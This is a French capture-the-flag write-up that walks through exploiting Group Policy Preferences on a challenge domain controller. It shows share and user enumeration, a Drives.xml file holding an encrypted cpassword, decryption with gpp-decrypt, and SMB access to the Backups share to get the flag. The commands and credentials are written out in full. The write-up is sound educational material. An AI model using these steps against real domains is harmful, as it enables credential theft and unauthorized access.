# The GPO Mission
``Facile``

``HF47``
> Dissimulée dans la mémoire d’un ancien module de commandement, une directive oubliée continue d’émettre ses signaux. Ce vestige d’une politique révolue renferme des fragments sensibles laissés à découvert, figés dans une configuration que plus personne ne surveille. Saurez-vous découvrir l’héritage de cette autorité fantôme ?

``51.89.229.210``

Identifiants de connexion:

``Nom d'utilisateur: pomme62092_404Player``

``Mot de passe: <password>``

En voyant le titre du challenge, j'ai directement pensé à [Get-GPPPassword.py](https://github.com/fortra/impacket/blob/master/examples/Get-GPPPassword.py)
pour trouver des mots de passe dans les préférences de stratégie de groupe, mais ça n'a pas marché. Je suis sûr qu'il y a un lien avec ces stratégies de groupe.

Article expliquant l'exploitation : https://podalirius.net/fr/articles/exploiting-windows-group-policy-preferences/

```
└─$ Get-GPPPassword.py 'ctfcorp.local'/'pomme62092_404Player':'<password>'@51.89.229.210
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Listing shares...
  - ADMIN$
  - Backups
  - C$
  - IPC$
  - NETLOGON
  - SYSVOL

[*] Searching *.xml files...

```

En tout cas on sait qu'il y a un share Backups que je ne peux pas lire avec mon compte 404CTF, ainsi que trois utilisateurs.

```
nxc smb 51.89.229.210 -u 'pomme62092_404Player' -p '<password>'


SMB         51.89.229.210   445    DC1              maintenance_svc               2025-05-05 16:04:03 0       Compte de maintenance système 
SMB         51.89.229.210   445    DC1              backup_reader                 2025-05-05 16:04:03 0       Compte de lecture des backups 
SMB         51.89.229.210   445    DC1              hidden_admin                  2025-05-05 16:04:03 0       Compte administrateur caché 
```
J'imagine qu'il faudra trouver le mot de passe de backup_reader pour pouvoir se connecter sur Backups avec.

En fouillant un peu dans SYSVOL (même méthodologie), je trouve plusieurs fichiers .xml, mais un va être particulièrement intéressant.

```
smb: \ctfcorp.local\Policies\{5F47AAF6-4BD4-4070-AB47-137BD0C3AC48}\User\Preferences\Drives\> ls
  .                                   D        0  Mon May  5 17:58:11 2025
  ..                                  D        0  Mon May  5 17:58:11 2025
  Drives.xml                          A      565  Mon May  5 17:58:11 2025



<Drives clsid="{8FDDCC1A-0C3C-43cd-A6B4-71A6DF20DA8C}">
<Drive clsid="{935D1B74-9CB8-4e3c-9914-7DD559B7A417}" name="Z:" status="Z:" image="0" changed="2024-01-15 08:30:21" uid="{12345678-90AB-CDEF-1234-567890ABCDEF}">
<Properties action="U" thisDrive="SHOW" allDrives="SHOW" userName="CTFCORP\backup_reader" password="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" path="\\DC1\Backups" label="Backups" persistent="0" useLetter="1" letter="Z"/>
</Drive>
</Drives>
```
Il y a un mot de passe dedans !

On peut le déchiffrer de plein de manières différentes (cf article), par exemple avec gpp-decrypt

```
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18

```

On peut alors se connecter sur Backup et récupérer un fichier flag.txt.

```
smbclient //51.89.229.210/Backups -U 'backup_reader%GPPstillStandingStrong2k18'

smb: \>get system_backup.txt 
```

404CTF{GPP_Pr3f3r3nc3s_4r3_D4ng3r0us!}